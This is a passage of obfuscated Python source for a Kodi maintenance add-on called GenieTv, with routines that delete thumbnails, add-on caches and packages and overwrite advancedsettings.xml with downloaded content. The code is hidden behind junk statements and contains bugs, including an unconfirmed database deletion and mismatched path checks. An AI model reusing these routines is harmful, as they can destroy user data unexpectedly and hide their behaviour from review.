 if 65 - 65: O0o0Ooo + oo0OO * oo0OO
 if 79 - 79: i1IIi / Oo - OOOo0 . O0
 if 56 - 56: OoO0O0 % O0 * i1IIi - OoOoOO00
 if 74 - 74: i1IIi - I1IiI % OoIii111II . O0 - OoooooooOO
 if 84 - 84: O0o0Ooo
 if 53 - 53: i1IIi
 if 59 - 59: OOooOOo + OOOo0 % OoooooooOO - iIii1I11I1II1
 if 9 - 9: i1IIi - I1IiI
 if 57 - 57: iIii1I11I1II1 * ii11i1 * oo0OO / OoIii111II
def iIIiII1i1ii ( ) :
 try :
  if os . path . exists ( oOOoO0 ) == True :
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   if i1iiIIiiI111 . yesno ( "Delete Thumbnails" , "[COLOR gold][B]##########WARNING ANDROID ONLY##########[/B][/COLOR]" , "This feature deletes your thumbnail folder and textures13.db" , "Are you sure you want to do proceed? This Can NOT Be Undone" ) :
    for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( oOOoO0 ) :
     o00Oo0O = 0
     o00Oo0O += len ( i1iIiiiiii1II )
     if o00Oo0O > 0 :
      for Ii1II1I11i1 in i1iIiiiiii1II :
       os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
  ii1IIIi = os . path . join ( OOooO0OOoo , "Textures13.db" )
  os . unlink ( ii1IIIi )
  i1iiIIiiI111 . ok ( "Restart KODI" , "Please restart KODI to rebuild thumbnail library" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Thumbnails please visit Kodi Support Group, GenieTv on facebook" )
 return
 if 78 - 78: OOooOOo / OOooOOo / OOOo0 . ii11ii1ii - OoooooooOO
 if 16 - 16: OoO0O0 % OoooooooOO - o0Oo0O0Oo00oO * ii11i1 - ii11i1
 if 27 - 27: OoO0O0 + iIii1I11I1II1 / Oo + Ooo00oOo00o % Oo + Ooo00oOo00o
 if 77 - 77: Oo * o0Oo0O0Oo00oO % ii11i1
 if 2 - 2: Ooo0OO0oOO / Oo / ii11i1 / ii11ii1ii / OoooooooOO
 if 22 - 22: iIii1I11I1II1 * OOOo0 / Ooo0OO0oOO + I1IiI
 if 98 - 98: iii11
 if 69 - 69: OoOoOO00 + Oo - OoIii111II . Oo / iIii1I11I1II1 * iIii1I11I1II1
 if 75 - 75: Ooo00oOo00o % OoooooooOO
def iiiI ( url ) :
 print '############################################################       DELETING STANDARD CACHE             ###############################################################'
 ooo0o00o = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'cache' )
 if os . path . exists ( ooo0o00o ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( ooo0o00o ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 86 - 86: OoO0O0 + I1IiI / OOOo0 + Ooo0OO0oOO % Ooo0OO0oOO / i11iIiiIii
   if 12 - 12: I1IiI + OOooOOo . O0o0Ooo
   if o00Oo0O > 0 :
    if 52 - 52: Ooo00oOo00o
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete KODI Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 4 - 4: ii11i1 % ii11ii1ii + Ooo0OO0oOO - ii11ii1ii
     for Ii1II1I11i1 in i1iIiiiiii1II :
      try :
       os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
      except :
       pass
     for I111iIi1 in IiiIiI1Ii1i :
      try :
       shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      except :
       pass
       if 98 - 98: ii11i1 - O0 * OoIii111II * ii11i1 * ii11i1
   else :
    pass
 if xbmc . getCondVisibility ( 'system.platform.ATV2' ) :
  i11IiII = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
  if 53 - 53: Ooo00oOo00o % ii11ii1ii . oo0OO . i1IIi . Ooo00oOo00o
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( i11IiII ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 26 - 26: OOOo0 % I1IiI
   if o00Oo0O > 0 :
    if 67 - 67: Oo - OoO0O0 * ii11i1 . OoooooooOO / i11iIiiIii
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ATV2 Cache Files" , str ( o00Oo0O ) + " files found in 'Other'" , "Do you want to delete them?" ) :
     if 61 - 61: OOooOOo % OOOo0 * i1IIi / OOOo0 / OoOoOO00 + O0o0Ooo
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 22 - 22: OoO0O0 . oo0OO + Oo
   else :
    pass
  IIIIiI1ii1 = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' )
  if 73 - 73: ii11i1
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( IIIIiI1ii1 ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 13 - 13: Ooo0OO0oOO - OoooooooOO / o0Oo0O0Oo00oO
   if o00Oo0O > 0 :
    if 80 - 80: iIii1I11I1II1 / i11iIiiIii + oo0OO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ATV2 Cache Files" , str ( o00Oo0O ) + " files found in 'LocalAndRental'" , "Do you want to delete them?" ) :
     if 41 - 41: O0o0Ooo + Ooo00oOo00o * OOOo0 * O0 * Oo - I1IiI
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 96 - 96: OOOo0 - iIii1I11I1II1
   else :
    pass
    if 25 - 25: OoooooooOO . ii11i1 % oo0OO . OoO0O0
    if 67 - 67: OoooooooOO + O0o0Ooo / o0Oo0O0Oo00oO
    if 75 - 75: OoO0O0 / OoooooooOO . OOOo0 + O0o0Ooo - OoOoOO00
    if 33 - 33: OoO0O0 / OoO0O0 . i11iIiiIii * ii11ii1ii + OOooOOo
 ii1iI11IiIIi = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 if os . path . exists ( ii1iI11IiIIi ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( ii1iI11IiIIi ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 47 - 47: iii11 . OoIii111II + I1IiI % OoO0O0 % i1IIi / iIii1I11I1II1
   if 95 - 95: O0 . Ooo00oOo00o
   if o00Oo0O > 0 :
    if 89 - 89: i1IIi
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete WTF Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 19 - 19: o0Oo0O0Oo00oO / OOooOOo % OoO0O0 - ii11i1
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 14 - 14: ii11ii1ii - i11iIiiIii * O0o0Ooo
   else :
    pass
    if 39 - 39: OoooooooOO
    if 19 - 19: i11iIiiIii
 oOOOOOoOOoo0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.4od/cache' ) , '' )
 if os . path . exists ( oOOOOOoOOoo0 ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( oOOOOOoOOoo0 ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 93 - 93: OoOoOO00 * I1IiI % OOooOOo
   if 67 - 67: OOooOOo + Oo . o0Oo0O0Oo00oO - i1IIi . I1IiI
   if o00Oo0O > 0 :
    if 12 - 12: OoO0O0 / Ooo00oOo00o / O0 * OoO0O0
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete 4oD Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 51 - 51: o0Oo0O0Oo00oO * oo0OO / i1IIi
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 2 - 2: OoIii111II + OoO0O0 . oo0OO - i1IIi + O0o0Ooo
   else :
    pass
    if 54 - 54: OoooooooOO . OoIii111II - oo0OO
    if 76 - 76: O0o0Ooo
 O00o0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 if os . path . exists ( O00o0 ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( O00o0 ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 98 - 98: iIii1I11I1II1 + i11iIiiIii * ii11ii1ii / O0o0Ooo / o0Oo0O0Oo00oO - O0
   if 42 - 42: oo0OO
   if o00Oo0O > 0 :
    if 77 - 77: i1IIi * OoIii111II % OoooooooOO + O0 * o0Oo0O0Oo00oO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete BBC iPlayer Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 28 - 28: Ooo0OO0oOO . OoooooooOO * iii11 + i11iIiiIii % OOOo0 . iIii1I11I1II1
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 63 - 63: OoOoOO00 - Ooo0OO0oOO . I1IiI
   else :
    pass
    if 8 - 8: OOOo0 * o0Oo0O0Oo00oO / OoO0O0 + I1IiI . OoO0O0 - iii11
    if 80 - 80: iIii1I11I1II1 / OoIii111II * Oo - iii11 * oo0OO
    if 97 - 97: OoO0O0 - Ooo0OO0oOO / OoOoOO00
 I11ii1i = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 if os . path . exists ( I11ii1i ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( I11ii1i ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 50 - 50: iIii1I11I1II1 - Ooo0OO0oOO % oo0OO - Oo
   if 52 - 52: OoIii111II + ii11i1 - ii11ii1ii * ii11i1 . iii11 + O0o0Ooo
   if o00Oo0O > 0 :
    if 43 - 43: OOOo0 % OoO0O0 % ii11ii1ii
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Simple Downloader Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 53 - 53: OoIii111II % iii11 % ii11ii1ii . O0o0Ooo . O0o0Ooo . oo0OO
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 73 - 73: oo0OO / o0Oo0O0Oo00oO + Ooo00oOo00o / I1IiI . OoOoOO00 * ii11i1
   else :
    pass
    if 21 - 21: OOOo0 - OOOo0 + oo0OO % OOOo0 * OoIii111II
    if 74 - 74: oo0OO / Ooo0OO0oOO . OOOo0 - OoooooooOO + OoOoOO00 + Ooo0OO0oOO
 I11iiI11I1II = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 if os . path . exists ( I11iiI11I1II ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( I11iiI11I1II ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 70 - 70: ii11ii1ii . OoO0O0
   if 41 - 41: OOooOOo % Oo
   if o00Oo0O > 0 :
    if 93 - 93: o0Oo0O0Oo00oO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ITV Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 82 - 82: ii11ii1ii / o0Oo0O0Oo00oO . i11iIiiIii + iii11 - I1IiI / oo0OO
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 99 - 99: OoIii111II / i1IIi
   else :
    pass
    if 2 - 2: OoIii111II . oo0OO
    if 42 - 42: Ooo00oOo00o - ii11ii1ii * OoO0O0 - o0Oo0O0Oo00oO
 O0oO00oO0o00o = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.movies4me/cache' ) , '' )
 if os . path . exists ( I11iiI11I1II ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( O0oO00oO0o00o ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 54 - 54: o0Oo0O0Oo00oO
   if 79 - 79: OOOo0 + OoIii111II % Ooo0OO0oOO % OoIii111II
   if o00Oo0O > 0 :
    if 56 - 56: ii11ii1ii + OoIii111II . Ooo00oOo00o + OoooooooOO * ii11ii1ii - O0
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Movies4me Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 35 - 35: iii11 . Ooo0OO0oOO . O0o0Ooo - Ooo0OO0oOO % Ooo0OO0oOO + O0o0Ooo
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 99 - 99: OOooOOo + iii11
   else :
    pass
    if 34 - 34: O0o0Ooo * OOooOOo . OOOo0 % i11iIiiIii
    if 61 - 61: iIii1I11I1II1 + OoIii111II * Ooo0OO0oOO - i1IIi % OoIii111II
 oOOo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 if os . path . exists ( I11iiI11I1II ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( oOOo ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 9 - 9: O0o0Ooo - Ooo00oOo00o + iIii1I11I1II1 % O0 + Ooo0OO0oOO + OoO0O0
   if 50 - 50: i1IIi + o0Oo0O0Oo00oO
   if o00Oo0O > 0 :
    if 64 - 64: OOooOOo % OoIii111II . o0Oo0O0Oo00oO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Phoenix Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 6 - 6: o0Oo0O0Oo00oO / i11iIiiIii - Oo
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 3 - 3: OoO0O0 - OoooooooOO * OoooooooOO - OOOo0 / O0o0Ooo * ii11ii1ii
   else :
    pass
    if 58 - 58: OoO0O0 % iIii1I11I1II1 / i11iIiiIii % OOooOOo . O0o0Ooo * oo0OO
    if 32 - 32: OoooooooOO + OOooOOo
 o0000OOOo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.spotitube/cache' ) , '' )
 if os . path . exists ( I11iiI11I1II ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( o0000OOOo ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 56 - 56: i1IIi + OoooooooOO % Ooo00oOo00o
   if 36 - 36: oo0OO * Ooo0OO0oOO * O0 * iii11 - OOooOOo / ii11ii1ii
   if o00Oo0O > 0 :
    if 54 - 54: i1IIi - Ooo00oOo00o / OoooooooOO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete YouTube Music Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 95 - 95: O0 + iIii1I11I1II1 . ii11ii1ii
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 61 - 61: ii11i1 * ii11i1
   else :
    pass
    if 70 - 70: O0o0Ooo . ii11ii1ii / OOooOOo * OoIii111II
    if 74 - 74: OOOo0 . o0Oo0O0Oo00oO / oo0OO . OoO0O0
 OO00I1iiiIi1i11i = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.supercartoons/cache' ) , '' )
 if os . path . exists ( I11iiI11I1II ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( OO00I1iiiIi1i11i ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 25 - 25: o0Oo0O0Oo00oO % oo0OO * oo0OO + iIii1I11I1II1 . i1IIi
   if 67 - 67: ii11ii1ii + OoIii111II * OoO0O0 / OoOoOO00 % Ooo00oOo00o % Ooo00oOo00o
   if o00Oo0O > 0 :
    if 28 - 28: I1IiI % OoIii111II - iii11 + iii11 + OoIii111II / iIii1I11I1II1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete SuperCartoons Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 91 - 91: OOOo0 / OoOoOO00 * iii11
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 94 - 94: OoOoOO00 - iIii1I11I1II1 - iIii1I11I1II1
   else :
    pass
    if 83 - 83: ii11ii1ii * iIii1I11I1II1 + I1IiI * i1IIi . OoooooooOO % ii11i1
    if 81 - 81: Ooo00oOo00o - iIii1I11I1II1
 o0oooO0O00OoO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.tvonline.cc/cache' ) , '' )
 if os . path . exists ( I11iiI11I1II ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( o0oooO0O00OoO ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 40 - 40: OoOoOO00
   if 7 - 7: iii11 / Ooo00oOo00o
   if o00Oo0O > 0 :
    if 88 - 88: i1IIi
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete TVonline Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 53 - 53: o0Oo0O0Oo00oO . iii11 . OOooOOo + OoIii111II
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 17 - 17: iIii1I11I1II1 + i1IIi . ii11ii1ii + ii11i1 % i1IIi . OoIii111II
   else :
    pass
    if 57 - 57: OoIii111II
    if 92 - 92: OoOoOO00 - Ooo00oOo00o - iii11 % OOOo0 - I1IiI * O0o0Ooo
 IiIi11 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.youtube/kodion' ) , '' )
 if os . path . exists ( I11iiI11I1II ) == True :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( IiIi11 ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 89 - 89: oo0OO . I1IiI . Ooo0OO0oOO
   if 55 - 55: oo0OO + Oo
   if o00Oo0O > 0 :
    if 95 - 95: Ooo0OO0oOO + Oo + Oo
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete YouTube Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 33 - 33: i1IIi % OoooooooOO / OoooooooOO
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
      if 88 - 88: O0o0Ooo - ii11i1 - OoIii111II + i1IIi
   else :
    pass
    if 15 - 15: iii11
    if 31 - 31: OoIii111II % i1IIi . OoooooooOO - OOooOOo + OoooooooOO
    if 45 - 45: iii11 + Ooo0OO0oOO / OoooooooOO - ii11i1 + OoooooooOO
 ii1i1I1111ii = xbmc . translatePath ( 'special://masterprofile/addon_data/plugin.video.genesis' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 try :
  if i1iiIIiiI111 . yesno ( "Delete Genesis Cache Files" , "Do you want to delete cache" ) :
   oo0ooo0O0O0O = os . path . join ( ii1i1I1111ii , "cache.db" )
   os . unlink ( oo0ooo0O0O0O )
   if 71 - 71: ii11ii1ii . O0o0Ooo
 except :
  pass
  if 16 - 16: OoIii111II - ii11ii1ii . I1IiI
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "                               Finished Deleting Cache " , "                          [COLOR gold]Brought To You By GenieTv[/COLOR]" )
 if 99 - 99: o0Oo0O0Oo00oO * iIii1I11I1II1 - ii11i1 + Oo . Oo
 if 18 - 18: iii11
 if 82 - 82: OoooooooOO - o0Oo0O0Oo00oO * ii11ii1ii * o0Oo0O0Oo00oO * O0 * iIii1I11I1II1
 if 31 - 31: o0Oo0O0Oo00oO . iii11 % o0Oo0O0Oo00oO
 if 33 - 33: O0 * ii11i1 - OoO0O0 . OoooooooOO + OoO0O0
 if 20 - 20: O0o0Ooo - I1IiI
 if 91 - 91: i1IIi
 if 31 - 31: i11iIiiIii + ii11i1 % I1IiI
 if 9 - 9: o0Oo0O0Oo00oO . Ooo0OO0oOO - Oo . O0o0Ooo
def i1I111II11 ( url ) :
 print '###' + o0oOoO00o + ' - DELETING PACKAGES###'
 o00oO = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 try :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( o00oO ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 32 - 32: oo0OO . iIii1I11I1II1 % Oo . OoooooooOO
   if 81 - 81: i11iIiiIii * oo0OO . OoIii111II * OoIii111II . OoO0O0
   if o00Oo0O > 0 :
    if 47 - 47: iIii1I11I1II1 % Ooo0OO0oOO . Ooo0OO0oOO / O0 . i11iIiiIii * ii11i1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Package Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 24 - 24: O0
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
     i1iiIIiiI111 = xbmcgui . Dialog ( )
     i1iiIIiiI111 . ok ( o0oOoO00o , "       Deleting Packages all done" )
    else :
     pass
   else :
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    i1iiIIiiI111 . ok ( o0oOoO00o , "       No Packages to DELETE" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Packages please visit Kodi Support Group, GenieTv on facebook" )
 return
 if 33 - 33: OoooooooOO + OoIii111II * OoOoOO00 / iii11
 if 87 - 87: OoooooooOO
 if 1 - 1: iIii1I11I1II1 / OOooOOo
 if 98 - 98: O0 % OOOo0 / OoooooooOO * ii11ii1ii - OoIii111II
 if 51 - 51: oo0OO + Ooo0OO0oOO
 if 54 - 54: OoOoOO00 * O0 % OOOo0 . Ooo0OO0oOO
 if 62 - 62: ii11i1 . i11iIiiIii % O0 % O0o0Ooo - Oo
 if 69 - 69: OoOoOO00 . I1IiI * I1IiI % ii11i1 + OOOo0
 if 100 - 100: i11iIiiIii - Oo
def i11I1Ii1Iiii1 ( url ) :
 print '###' + o0oOoO00o + ' - DELETING PACKAGES###'
 o00oO = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 try :
  for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( o00oO ) :
   o00Oo0O = 0
   o00Oo0O += len ( i1iIiiiiii1II )
   if 64 - 64: ii11i1 . OoooooooOO - ii11ii1ii
   if 19 - 19: Oo
   if o00Oo0O > 0 :
    if 15 - 15: Oo . o0Oo0O0Oo00oO / OOooOOo
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Package Cache Files" , str ( o00Oo0O ) + " files found" , "Do you want to delete them?" ) :
     if 23 - 23: Ooo00oOo00o % OoooooooOO * o0Oo0O0Oo00oO
     for Ii1II1I11i1 in i1iIiiiiii1II :
      os . unlink ( os . path . join ( OOOOO , Ii1II1I11i1 ) )
     for I111iIi1 in IiiIiI1Ii1i :
      shutil . rmtree ( os . path . join ( OOOOO , I111iIi1 ) )
     i1iiIIiiI111 = xbmcgui . Dialog ( )
     i1iiIIiiI111 . ok ( o0oOoO00o , "       Deleting Packages all done" )
    else :
     pass
   else :
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    i1iiIIiiI111 . ok ( o0oOoO00o , "       No Packages to DELETE" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Packages please visit Kodi Support Group, GenieTv on facebook" )
 return
 iiiI ( url )
 if 6 - 6: OOOo0 . OoOoOO00 + O0o0Ooo / Ooo00oOo00o % OOOo0 . OoooooooOO
 if 64 - 64: iIii1I11I1II1 + OoOoOO00 . oo0OO % Oo * o0Oo0O0Oo00oO
 if 7 - 7: i1IIi + i1IIi / OoO0O0
 if 32 - 32: ii11i1 * ii11ii1ii - OoooooooOO / OOOo0 . o0Oo0O0Oo00oO - i1IIi
 if 60 - 60: I1IiI % I1IiI
 if 2 - 2: ii11i1 . O0 - OoIii111II + OoO0O0
 if 96 - 96: ii11i1 + ii11i1
 if 28 - 28: oo0OO
 if 6 - 6: OOOo0 - oo0OO
def ii1IIOOo00o0o0O0oo ( url , name ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 i1iI1iIII = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 oo0Oo = os . path . join ( OO0O00oOo , 'advancedsettings.xml.bak' )
 if os . path . exists ( oo0Oo ) == False :
  if i1iiIIiiI111 . yesno ( "Back Up Original" , 'Have You Backed Up Your Original?' , '' , "[B][COLOR red]     AS YOU CANNOT GO BACK !!![/B][/COLOR]" ) :
   print '###' + o0oOoO00o + ' - ADVANCED XML###'
   OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
   i1iI1iIII = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
   try :
    os . remove ( i1iI1iIII )
    print '=== GenieTv - REMOVING    ' + str ( i1iI1iIII ) + '    ==='
   except :
    pass
   oOooo0O0o = i1 . http_GET ( url ) . content
   oOoooooOoO = open ( i1iI1iIII , "w" )
   oOoooooOoO . write ( oOooo0O0o )
   oOoooooOoO . close ( )
   print '=== GenieTv - WRITING NEW    ' + str ( i1iI1iIII ) + '    ==='
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   i1iiIIiiI111 . ok ( o0oOoO00o , "       Done Adding new Advanced XML" )
 else :
  print '###' + o0oOoO00o + ' - ADVANCED XML###'
  OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
  i1iI1iIII = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
  try :
   os . remove ( i1iI1iIII )
   print '=== GenieTv - REMOVING    ' + str ( i1iI1iIII ) + '    ==='
  except :
   pass
  oOooo0O0o = i1 . http_GET ( url ) . content
  oOoooooOoO = open ( i1iI1iIII , "w" )
  oOoooooOoO . write ( oOooo0O0o )
  oOoooooOoO . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( i1iI1iIII ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "       Done Adding new Advanced XML" )
 return
 if 13 - 13: OoO0O0 . Oo - Ooo0OO0oOO / OoIii111II - Oo - OOOo0
def oOO0o ( url , name ) :
 print '###' + o0oOoO00o + ' - CHECK ADVANCE XML###'
